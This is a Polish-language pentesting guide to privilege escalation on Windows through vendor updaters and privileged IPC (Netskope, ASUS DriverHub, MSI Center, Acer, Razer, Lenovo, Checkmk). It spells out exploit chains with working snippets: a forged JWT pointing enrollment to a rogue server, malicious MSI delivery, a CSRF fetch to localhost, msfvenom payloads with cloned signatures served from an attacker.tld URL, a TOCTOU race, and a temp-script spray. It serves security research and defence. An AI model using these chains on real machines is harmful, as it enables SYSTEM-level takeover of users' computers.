# Nadużywanie korporacyjnych automatycznych aktualizatorów i uprzywilejowanego IPC (np. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów lokalnej eskalacji uprawnień w systemie Windows, wykrytych w korporacyjnych agentach i aktualizatorach endpointów, które udostępniają łatwo dostępny interfejs IPC oraz uprzywilejowany mechanizm aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), w którym użytkownik z niskimi uprawnieniami może wymusić rejestrację w kontrolowanym przez atakującego serwerze, a następnie dostarczyć złośliwy MSI, który usługa zainstaluje jako SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Najważniejsze pomysły, które można wykorzystać w przypadku podobnych produktów:
- Nadużyj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub zmianę konfiguracji na serwer kontrolowany przez atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz fałszywy Trusted Root CA i wskaż aktualizatorowi złośliwy, „podpisany” pakiet.
- Omiń słabe kontrole podpisującego (listy dozwolonych CN), opcjonalne flagi digest i luźne właściwości MSI.
- Jeśli IPC jest „szyfrowane”, wyprowadź klucz/IV z identyfikatorów komputera dostępnych do odczytu dla wszystkich, przechowywanych w rejestrze.
- Jeśli usługa ogranicza wywołujących na podstawie ścieżki obrazu/nazwy procesu, wstrzyknij kod do procesu z listy dozwolonych albo uruchom taki proces w stanie wstrzymania i załaduj DLL przez minimalną modyfikację kontekstu wątku.

Niestandardowe lokalne usługi TCP wymagają takiej samej weryfikacji tożsamości i granic danych wejściowych, nawet jeśli wymagają PIN-u lub innych danych uwierzytelniających aplikacji. Powiąż listener z jego procesem i efektywnym kontem usługi, a następnie sprawdź dokładny wdrożony plik binarny/wersję oraz to, czy pola kontrolowane przez wywołującego są sprawdzane pod kątem długości przed skopiowaniem do buforów o stałym rozmiarze lub użyciem do utworzenia polecenia procesu potomnego. [Wskazówki Microsoft dotyczące przepełnienia bufora](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) wyjaśniają, dlaczego niesprawdzone dane zewnętrzne są niebezpieczne w uprzywilejowanym kodzie natywnym. Listener loopback, zakodowane na stałe dane uwierzytelniające ani sama nazwa procesu nie dowodzą występowania uszkodzenia pamięci ani możliwości wykonania kodu jako SYSTEM; osiągalność, autoryzacja, ścieżka kodu i zabezpieczenia pozostają odrębnymi warunkami. Rutynowe rozpoznanie powinno pozostać pasywne — nie wysyłaj do działającej usługi danych wejściowych o długości powodującej awarię.

---
## 1) Wymuszanie rejestracji na serwerze atakującego przez localhost IPC

Wiele agentów zawiera proces interfejsu użytkownika działający w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP przy użyciu JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (niska integralność) ↔ usługa: stAgentSvc (SYSTEM)
- ID polecenia IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploita:
1) Przygotuj token rejestracyjny JWT, którego claims pozwalają kontrolować host backendu (np. AddonUrl). Użyj alg=None, aby podpis nie był wymagany.
2) Wyślij komunikat IPC wywołujący polecenie rejestracji z użyciem tokenu JWT i nazwy tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Usługa zaczyna wysyłać żądania do Twojego rogue servera w celu rejestracji/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Uwagi:
- Jeśli weryfikacja wywołującego opiera się na ścieżce/nazwie, wyślij żądanie z dozwolonego pliku binarnego dostawcy (zob. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC zarządzania dostępne przez sieć

Ta granica zaufania nie zawsze ogranicza się do localhost. W zgłoszonym przypadku MyReport Updater 2.1.1 usługa `LocalSystem` nasłuchiwała na wszystkich interfejsach i akceptowała nieuwierzytelnioną zmianę konfiguracji gRPC dotyczącą hosta referencyjnego, portu i trybu działania. Wariant zdalny wymagał zarówno dostępu sieciowego do nasłuchującego procesu, jak i dostępu wychodzącego z usługi do wybranego hosta referencyjnego. Oceniaj te kwestie niezależnie od tego, czy późniejszy przepływ pakietu może przekroczyć granicę zapisu plików.<sup>[[16]](#references)</sup>

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient zacznie komunikować się z Twoim serwerem, zaimplementuj oczekiwane endpointy i skieruj go na złośliwy plik MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem aktualizatora, np.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Zwróć certyfikat CA w formacie PEM. Usługa instaluje go w magazynie Trusted Root komputera lokalnego.
3) /v2/checkupdate → Podaj metadane wskazujące na złośliwy MSI i fałszywą wersję.

Obejście typowych kontroli spotykanych w praktyce:
- Lista dozwolonych CN wystawcy: usługa może sprawdzać tylko, czy Subject CN jest równy „netSkope Inc” lub „Netskope, Inc.”. Twoje rogue CA może wystawić certyfikat końcowy z takim CN i podpisać MSI.
- Właściwość CERT_DIGEST: dodaj do MSI nieszkodliwą właściwość o nazwie CERT_DIGEST. Podczas instalacji nie jest ona weryfikowana.
- Opcjonalna weryfikacja digestu: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową weryfikację kryptograficzną.

Wynik: usługa SYSTEM instaluje MSI z lokalizacji
C:\ProgramData\Netskope\stAgent\data\*.msi
i wykonuje dowolny kod jako NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Wniosek z obchodzenia poprawek: jeśli dostawca zareaguje, dodając do listy dozwolonych niewielką liczbę „zaufanych” domen, zamiast uwierzytelniać kryptograficznie źródło aktualizacji, poszukaj należących do dostawcy redirectorów lub reverse proxies, które nadal pozwalają przekierować ruch. W przypadku Netskope publiczne badania opublikowane później wykazały, że lista dozwolonych z epoki R129 nadal mogła zostać wykorzystana za pośrednictwem `rproxy.goskope.com`, który działał jako proxy dla treści Azure App Service kontrolowanych przez atakującego. Traktuj listy dozwolonych nazw hostów jako utrudnienie, a nie granicę zaufania.<sup>[[14]](#references)</sup>

Innym błędem są **spójne wewnętrznie, ale nieuwierzytelnione metadane pakietu**. W przypadku MyReport referencja kontrolowana przez atakującego udostępniała zmodyfikowane archiwum, a pośrednik zmieniał odpowiedzi dostawcy dotyczące digestu MD5 i rozmiaru, zanim dotarły do aktualizatora. Zgodność tych wartości potwierdzała spójność odpowiedzi, a nie pochodzenie od dostawcy; nie było potrzeby uzyskania kolizji MD5. Katalog instalacyjny wskazany przez wywołującego sprawiał następnie, że uprzywilejowane rozpakowywanie stanowiło granicę zapisu plików. Wynikający z tego prymityw ładowania DLL opisano w sekcji [łączenie dowolnego zapisu pliku z DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Fałszowanie zaszyfrowanych żądań IPC (jeśli występują)

Od R127 Netskope opakowywał JSON IPC w polu encryptData, które wygląda jak Base64. Analiza wykazała, że używano AES z kluczem i IV wyprowadzanymi z wartości rejestru dostępnych do odczytu dla każdego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać prawidłowe zaszyfrowane polecenia ze zwykłego konta użytkownika.<sup>[[1]](#references)[[2]](#references)</sup> Ogólna wskazówka: jeśli agent nagle zaczyna „szyfrować” swoje IPC, poszukaj identyfikatorów urządzenia, GUID-ów produktu i identyfikatorów instalacji w HKLM, które mogą służyć jako materiał.

---
## 4) Omijanie list dozwolonych wywołujących IPC (kontrole ścieżki/nazwy)

Niektóre usługi próbują uwierzytelnić drugą stronę, ustalając PID połączenia TCP i porównując ścieżkę/nazwę obrazu z listą dozwolonych plików binarnych dostawcy znajdujących się w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne obejścia:
- DLL injection do procesu z listy dozwolonych (np. nsdiag.exe) i przekazywanie żądań IPC z jego wnętrza.
- Uruchomienie pliku binarnego z listy dozwolonych w stanie wstrzymania i załadowanie proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić reguły ochrony przed manipulacją wymuszane przez sterownik.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Przyjazne dla ochrony przed manipulacją wstrzykiwanie: wstrzymany proces + modyfikacja NtContinue

Produkty często zawierają sterownik minifilter/OB callbacks (np. Stadrv), który odbiera niebezpieczne uprawnienia uchwytom do chronionych procesów:
- Proces: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Wątek: ogranicza uprawnienia do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader w trybie użytkownika, który respektuje te ograniczenia:
1) Wywołaj CreateProcess dla pliku binarnego dostawcy z flagą CREATE_SUSPENDED.
2) Uzyskaj dozwolone uchwyty: PROCESS_VM_WRITE | PROCESS_VM_OPERATION dla procesu oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (albo tylko THREAD_RESUME, jeśli modyfikujesz kod przy znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, zawsze mapowany thunk) krótkim stubem, który wywołuje LoadLibraryW ze ścieżką do twojej biblioteki DLL, a następnie wraca do poprzedniego miejsca.
4) Wywołaj ResumeThread, aby uruchomić stub w procesie i załadować bibliotekę DLL.

Ponieważ nie użyto PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME wobec już chronionego procesu (to ty go utworzyłeś), polityka sterownika jest spełniona.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktyczne narzędzia
- NachoVPN (wtyczka Netskope) automatyzuje utworzenie rogue CA, podpisanie złośliwego MSI i udostępnianie wymaganych endpointów: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope to niestandardowy klient IPC, który tworzy dowolne komunikaty IPC (opcjonalnie szyfrowane AES) i zawiera mechanizm wstrzykiwania do wstrzymanego procesu, aby wysyłać żądania z pliku binarnego z listy dozwolonych.<sup>[[4]](#references)</sup>

## 7) Szybki schemat wstępnej analizy nieznanych interfejsów aktualizatora/IPC

W przypadku nowego agenta endpoint lub pakietu narzędzi „pomocniczych” do płyty głównej szybki schemat postępowania zwykle wystarcza, by ocenić, czy masz do czynienia z obiecującym celem do privesc:<sup>[[6]](#references)</sup>

1) Wylistuj nasłuchujące procesy loopback i powiąż je z procesami dostawcy:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Wypisz potencjalne named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Pozyskiwanie danych routingu przechowywanych w rejestrze, używanych przez serwery IPC oparte na wtyczkach:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i identyfikatory poleceń z klienta działającego w trybie użytkownika. Spakowane frontendowe aplikacje Electron/.NET często leakują pełny schemat:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Szukaj faktycznego predykatu zaufania, a nie tylko ścieżki kodu, która ostatecznie uruchamia proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Wzorce, którym warto nadać priorytet:
- `CryptQueryObject`/parsowanie certyfikatu bez `WinVerifyTrust` zwykle oznacza, że „certyfikat istnieje” uznano za „certyfikat jest zaufany”, co umożliwia klonowanie certyfikatu lub inne sztuczki z fałszywym signerem.
- Sprawdzanie podciągów/sufiksów w `Origin`, `Referer`, URL-ach pobierania, nazwach procesów lub CN signerów nie jest uwierzytelnianiem. `contains(".vendor.com")` zwykle można wykorzystać za pomocą kontrolowanych przez atakującego domen podszywających się pod zaufaną domenę.
- Jeśli GUI o niskich uprawnieniach decyduje, że „plik jest zaufany”, a broker SYSTEM jedynie przyjmuje ten wynik, patchowanie lub ponowna implementacja DLL/JS po stronie klienta często całkowicie omija tę granicę (podział walidacji w stylu Razer).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a następnie waliduje go lub planuje jego wykonanie z tej ścieżki, od razu sprawdź okna podmiany TOCTOU oraz sąsiednie moduły pluginów udostępniające alternatywne wrappery `ExecuteTask()` ze słabszymi kontrolami.<sup>[[6]](#references)</sup>

W przypadku celów intensywnie korzystających z named pipe’ów PipeViewer pozwala szybko wykryć słabe DACL-e i zdalnie dostępne pipe’y, zanim zaczniesz szczegółowo odwracać protokół.<sup>[[11]](#references)</sup>

Jeśli cel uwierzytelnia wywołujących wyłącznie na podstawie PID, ścieżki obrazu lub nazwy procesu, potraktuj to jako przeszkodę, a nie granicę: wstrzyknięcie kodu do legalnego klienta lub nawiązanie połączenia z procesu znajdującego się na allowliście często wystarczy, by spełnić wymagania serwera. W przypadku named pipe’ów [ta strona o impersonacji klienta i nadużywaniu pipe’ów](named-pipe-client-impersonation.md) dokładniej omawia ten mechanizm.

W przypadku uprzywilejowanego **brokera czyszczenia lub przywracania** sprawdź granicę zaufania ścieżek, a także ACL pipe’a. Wywołujący o niższych uprawnieniach może mieć możliwość wybrania miejsca docelowego przywracania lub zmiany nazwy tymczasowego artefaktu kopii zapasowej we współdzielonym katalogu, nawet jeśli plik wykonywalny usługi i jej katalog instalacyjny są chronione. Osobno potwierdź, że wywołujący może uruchomić polecenie przywracania, zmodyfikować dokładny plik wejściowy lub nazwę pliku tymczasowego, broker działa z wyższą tożsamością, a operacja przywracania rzeczywiście zapisuje dane w wybranej chronionej lokalizacji. Sam zapisywalny katalog tymczasowy lub dostępny do odczytu pipe nie dowodzi możliwości dowolnego zapisu z podwyższonymi uprawnieniami; mapowanie lokalizacji docelowej i działanie usługi wymagają przeglądu kodu lub kontrolowanych testów. Nie uruchamiaj nieznanego polecenia czyszczenia podczas pasywnego rozpoznania, ponieważ może ono usunąć pliki użytkownika.

---
## 8) Modularne brokery dodatków uwierzytelniające wyłącznie na podstawie podpisów dostawcy (wzorzec Lenovo Vantage)

Nowszym wariantem, którego warto szukać, jest **broker RPC z uwierzytelnianiem klienta na podstawie podpisu**: proces desktopowy Lenovo o niskich uprawnieniach, podpisany przez Lenovo, komunikuje się z usługą SYSTEM, a usługa kieruje polecenia JSON do zestawu dodatków opisanych w XML w `%ProgramData%`. Po uzyskaniu wykonania kodu **wewnątrz dowolnego zaakceptowanego, podpisanego klienta** każdy kontrakt `runas="system"` staje się częścią powierzchni ataku.<sup>[[15]](#references)</sup>

Wartościowe prymitywy zaobserwowane w badaniach Lenovo Vantage:
- **Zaufanie do wywołującego, bo jest podpisany przez dostawcę**: badacze uzyskali uwierzytelniony kontekst, kopiując podpisany przez Lenovo plik EXE do zapisywalnego katalogu i spełniając warunek side-loadingu DLL (`profapi.dll`), dzięki czemu dowolny kod uruchomił się wewnątrz klienta, któremu usługa już ufała.
- **Odkrywanie powierzchni ataku na podstawie manifestów**: dodatki są deklarowane w `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów działa jako `SYSTEM`, więc enumeracja tych manifestów często szybciej ujawnia rzeczywiste uprzywilejowane czasowniki niż odwracanie samego brokera.
- **Błędy poszczególnych poleceń za uwierzytelnionym kanałem**: po uzyskaniu dostępu do zaufanego klienta publiczne badania ujawniły traversal ścieżek i race condition w poleceniach aktualizacji/instalacji, nadużywanie raw SQL w uprzywilejowanych bazach ustawień oraz sprawdzanie ścieżek rejestru na podstawie podciągów, które umożliwiało zapisy poza zamierzonym hive’em.

Przydatne rozpoznanie celu:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktyczny wniosek: gdy pakiet pomocniczy udostępnia brokera, który najpierw uwierzytelnia **proces wywołujący**, a dopiero potem przekazuje żądania do dziesiątek poleceń pluginów/dodatków, nie poprzestawaj na obejściu kontroli zaufania na wejściu. Zrzutuj tabelę manifestu/kontraktu i fuzzuj niezależnie każde polecenie o wysokich uprawnieniach; uwierzytelniony kanał zwykle skrywa kilka błędów drugiego etapu.

---
## 1) CSRF z przeglądarki do localhost przeciwko uprzywilejowanym API HTTP (ASUS DriverHub)

DriverHub dostarcza działającą w trybie użytkownika usługę HTTP (ADU.exe) pod adresem 127.0.0.1:53000, która oczekuje żądań z przeglądarki pochodzących z https://driverhub.asus.com. Filtr origin po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin oraz na adresach URL pobierania udostępnianych przez `/asus/v1.0/*`. Dlatego każda kontrolowana przez atakującego domena, taka jak `https://driverhub.asus.com.attacker.tld`, przechodzi kontrolę i może wysyłać z JavaScriptu żądania zmieniające stan.<sup>[[6]](#references)</sup> Zobacz [podstawy CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md), aby poznać dodatkowe wzorce obejścia.

Praktyczny przebieg:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść na niej złośliwą stronę internetową.
2) Użyj `fetch` lub XHR, aby wywołać uprzywilejowany endpoint (np. `Reboot`, `UpdateApp`) pod adresem `http://127.0.0.1:53000`.
3) Wyślij treść JSON oczekiwaną przez handler – spakowany JavaScript frontendu pokazuje poniższy schemat.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Nawet pokazane poniżej polecenie CLI PowerShell kończy się powodzeniem, gdy nagłówek Origin zostanie sfałszowany tak, aby zawierał zaufaną wartość:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Każda wizyta w witrynie atakującego w przeglądarce staje się więc lokalnym CSRF wymagającym jednego kliknięcia (lub bez kliknięcia, przez `onload`), który uruchamia helpera z uprawnieniami SYSTEM.

---
## 2) Niebezpieczna weryfikacja podpisu kodu i klonowanie certyfikatu (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne określone w treści JSON i buforuje je w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja adresu URL pobierania ponownie wykorzystuje tę samą logikę sprawdzania podciągu, więc akceptowany jest adres `http://updates.asus.com.attacker.tld:8000/payload.exe`. Po pobraniu ADU.exe jedynie sprawdza, czy plik PE zawiera podpis i czy ciąg Subject odpowiada ASUS, a następnie go uruchamia — bez `WinVerifyTrust` i bez walidacji łańcucha certyfikatów.

Aby wykorzystać ten mechanizm:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj do niego certyfikat podpisującego ASUS (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Udostępnij `pwn.exe` w domenie podszywającej się pod `.asus.com` i wywołaj UpdateApp przez opisany wyżej CSRF z przeglądarki.

Ponieważ zarówno filtry Origin, jak i URL opierają się na sprawdzaniu podciągu, a weryfikacja podpisującego polega wyłącznie na porównaniu ciągów, DriverHub pobiera i uruchamia plik binarny atakującego z podwyższonymi uprawnieniami.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU w ścieżkach kopiowania/uruchamiania aktualizatora (MSI Center CMD_AutoUpdateSDK)

Usługa MSI Center działająca jako SYSTEM udostępnia protokół TCP, w którym każda ramka ma postać `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) zawiera polecenie `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego handler:
1) Kopiuje dostarczony plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis za pomocą `CS_CommonAPI.EX_CA::Verify` (subject certyfikatu musi być równy „MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` musi zakończyć się powodzeniem).
3) Tworzy zaplanowane zadanie, które uruchamia plik tymczasowy jako SYSTEM z argumentami kontrolowanymi przez atakującego.

Skopiowany plik nie jest blokowany między weryfikacją a wywołaniem `ExecuteTask()`. Atakujący może:
- Wysłać ramkę A wskazującą na prawidłowy plik binarny podpisany przez MSI (co gwarantuje pomyślne przejście kontroli podpisu i dodanie zadania do kolejki).
- Przeprowadzić wyścig, wysyłając wielokrotnie wiadomości ramki B wskazujące na złośliwy payload, nadpisując `MSI Center SDK.exe` zaraz po zakończeniu weryfikacji.

Gdy harmonogram uruchomi zadanie, wykona nadpisany payload jako SYSTEM, mimo że zweryfikowano oryginalny plik. Niezawodne wykorzystanie wymaga dwóch goroutines/wątków wysyłających polecenie CMD_AutoUpdateSDK aż do wygrania wyścigu TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Nadużywanie niestandardowego IPC na poziomie SYSTEM i impersonacji (MSI Center + Acer Control Centre)

### Zestawy poleceń TCP MSI Center
- Każda wtyczka/DLL ładowana przez `MSI.CentralServer.exe` otrzymuje Component ID zapisany w `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wskazują komponent, pozwalając atakującym kierować polecenia do dowolnych modułów.
- Wtyczki mogą definiować własne moduły uruchamiające zadania. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` **bez weryfikacji podpisu** — każdy użytkownik lokalny może wskazać `C:\Users\<user>\Desktop\payload.exe` i deterministycznie uzyskać wykonanie jako SYSTEM.
- Nasłuchiwanie ruchu loopback za pomocą Wiresharka lub instrumentacja binariów .NET w dnSpy szybko ujawniają mapowanie komponentów i poleceń; następnie można odtwarzać ramki za pomocą własnych klientów w Go/Pythonie.<sup>[[6]](#references)</sup>

### Nazwane pipes Acer Control Centre i poziomy impersonacji
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego uznaniowa lista ACL zezwala na połączenia klientów zdalnych (np. `\\TARGET\pipe\treadstone_service_LightMode`). Wysłanie polecenia o ID `7` wraz ze ścieżką do pliku wywołuje procedurę usługi uruchamiającą proces.
- Biblioteka klienta serializuje bajt terminatora o wartości 113 wraz z argumentami. Instrumentacja dynamiczna za pomocą Fridy/`TsDotNetLib` (wskazówki dotyczące instrumentacji znajdziesz w [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) pokazuje, że natywny handler mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` i SID integralności przed wywołaniem `CreateProcessAsUser`.
- Zastąpienie 113 (`0x71`) wartością 114 (`0x72`) powoduje przejście do ogólnej gałęzi, która zachowuje pełny token SYSTEM i ustawia SID wysokiej integralności (`S-1-16-12288`). Uruchomiony plik binarny działa więc jako nieograniczony SYSTEM, zarówno lokalnie, jak i między maszynami.
- Połącz to z udostępnioną flagą instalatora (`Setup.exe -nocheck`), aby zainstalować ACC nawet na laboratoryjnych maszynach wirtualnych i przetestować pipe bez sprzętu producenta.<sup>[[6]](#references)</sup>

Te błędy IPC pokazują, dlaczego usługi localhost muszą wymagać wzajemnego uwierzytelniania (SID ALPC, filtry `ImpersonationLevel=Impersonation`, filtrowanie tokenów) oraz dlaczego helpery każego modułu służące do „uruchamiania dowolnego pliku binarnego” muszą stosować te same mechanizmy weryfikacji podpisu.

---
## 3) Helpery COM/IPC typu „elevator” oparte na słabej walidacji w trybie użytkownika (Razer Synapse 4)

Razer Synapse 4 wprowadził kolejny przydatny przykład z tej rodziny: użytkownik o niskich uprawnieniach może poprosić helpera COM o uruchomienie procesu przez `RzUtility.Elevator`, podczas gdy decyzja o zaufaniu jest delegowana do biblioteki DLL działającej w trybie użytkownika (`simple_service.dll`), zamiast być skutecznie egzekwowana w uprzywilejowanej granicy.

Zaobserwowana ścieżka wykorzystania:
- Utwórz obiekt COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)`, aby zażądać uruchomienia z podwyższonymi uprawnieniami.
- W publicznym PoC kontrola podpisu PE w `simple_service.dll` jest wyłączana przed wysłaniem żądania, co pozwala uruchomić dowolny plik wykonywalny wybrany przez atakującego.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalne wywołanie w PowerShellu:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Ogólny wniosek: podczas analizowania zestawów „helper” nie poprzestawaj na localhost TCP ani nazwanych potokach. Sprawdź, czy istnieją klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa sama sprawdza plik binarny będący celem operacji, czy jedynie ufa wynikowi obliczonemu przez możliwą do podmiany bibliotekę DLL klienta działającą w trybie user-mode. Ten wzorzec występuje nie tylko w Razer: każdy podział, w którym broker o wysokich uprawnieniach korzysta z decyzji allow/deny pochodzącej z części o niskich uprawnieniach, może stanowić powierzchnię privesc.


---
## Przewidywalne wykonywanie skryptu tymczasowego podczas naprawy MSI (Checkmk Agent / CVE-2024-0670)

Niektóre agenty Windows wciąż realizują uprzywilejowane działania, zapisując tymczasowy plik `.cmd` w `C:\Windows\Temp` i uruchamiając go jako `SYSTEM`. Jeśli nazwa pliku jest przewidywalna, a usługa nie odtwarza bezpiecznie już istniejących plików, użytkownik o niskich uprawnieniach może wcześniej utworzyć przyszły plik tymczasowy jako **tylko do odczytu** i sprawić, że uprzywilejowany proces wykona treść kontrolowaną przez atakującego zamiast własnego skryptu.

Zaobserwowano w podatnych kompilacjach Checkmk Agent:
- wzorzec pliku tymczasowego: `cmk_all_<PID>_1.cmd`
- podatne gałęzie: `2.0.0`, `2.1.0`, `2.2.0`
- wyzwalacz: **naprawa** MSI buforowanego pakietu agenta<sup>[[8]](#references)[[9]](#references)</sup>

Praktyczny przebieg:
1. Oszacuj realistyczny zakres PID na podstawie bieżących identyfikatorów procesów lub PID uruchomionego agenta.
2. Zapisz krótki **ASCII** payload `.cmd` (`Set-Content -Encoding Ascii` lub przekierowanie `cmd.exe`; unikaj zapisu PowerShell w formacie UTF-16 dla plików wsadowych).
3. Wykonaj spray plików `C:\Windows\Temp\cmk_all_<PID>_1.cmd` w całym wybranym zakresie i oznacz każdy plik jako tylko do odczytu.
4. Uruchom naprawę buforowanego MSI, aby uprzywilejowana usługa spróbowała ponownie utworzyć, a następnie wykonała skrypt tymczasowy.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Jeśli podatny produkt został zainstalowany za pomocą Windows Installer, przed uruchomieniem naprawy ustal, z jakim produktem powiązany jest losowo wyglądający plik MSI z pamięci podręcznej w `C:\Windows\Installer`:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Uwagi operacyjne:
- `qwinsta` jest przydatne, gdy `msiexec /fa` kończy się niepowodzeniem w nieinteraktywnej powłoce WinRM i trzeba ustalić, czy istniejąca sesja pulpitu lub sesja rozłączona może prawidłowo uruchomić naprawę.<sup>[[7]](#references)</sup>
- Ten wzorzec można uogólnić na inne agenty endpointowe i aktualizatory, które **umieszczają tymczasowe skrypty w lokalizacjach zapisywalnych dla wszystkich, a następnie uruchamiają je jako SYSTEM**. Sprawdź, czy nazwy są przewidywalne, brakuje semantyki wyłącznego tworzenia plików oraz czy można na żądanie uruchomić proces naprawy/aktualizacji.

### Naprawa interaktywnego instalatora i uprzywilejowana konsola

